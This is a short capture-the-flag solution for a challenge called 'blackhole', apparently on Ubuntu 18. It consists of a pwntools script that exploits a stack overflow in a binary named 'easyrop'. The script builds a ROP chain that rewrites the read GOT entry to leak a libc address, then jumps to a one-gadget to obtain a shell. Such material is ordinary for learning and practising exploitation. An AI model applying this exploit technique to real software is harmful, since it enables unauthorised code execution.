### blackhole

**ubuntu18**

自己探索

~~~
from pwn import *

#p = remote('10.212.25.14', 14419)
p = process("./easyrop", level="debug")
elf = ELF('./easyrop')
libc = ELF('./libc64.so')
# libc = elf.libc

pop_all = 0x04006DA # pop rbx, rbp, 12, 13, 14, 15, ret

payload = b"A" * 0x40
payload += p64(0xaaaaaaaa)
payload += p64(pop_all)
diff = libc.sym['write'] - libc.sym['read']
print(diff & 0xffffffffffffffff)
payload += p64(diff & 0xffffffffffffffff)
payload += p64(0x0601020 + 0x3d)
payload += b"\x00" * 8 * 4
payload += p64(0x00000000004005d8)
payload += p64(0x00000000004006e3) 
payload += p64(1) 
payload += p64(0x00000000004006e1)
payload += p64(elf.got['read'])
payload += p64(0) 
payload += p64(elf.plt['read'])
payload += p64(pop_all)
payload += p64((-diff) & 0xffffffffffffffff)
payload += p64(0x0601020 + 0x3d)
payload += b"\x00" * 8 * 4
payload += p64(0x00000000004005d8) 
payload += p64(0x400510) 
print(hex(len(payload)))
p.send(payload)
write = u64(p.recv(6) + b'\x00' + b'\x00')
libc_addr = write - libc.sym['write']

log.info(hex(libc_addr))

payload = b"A" * 0x40
payload += p64(0xaaaaaaaa)
payload += p64(libc_addr + 0x10a41c)
p.sendline(payload)

p.interactive()

~~~

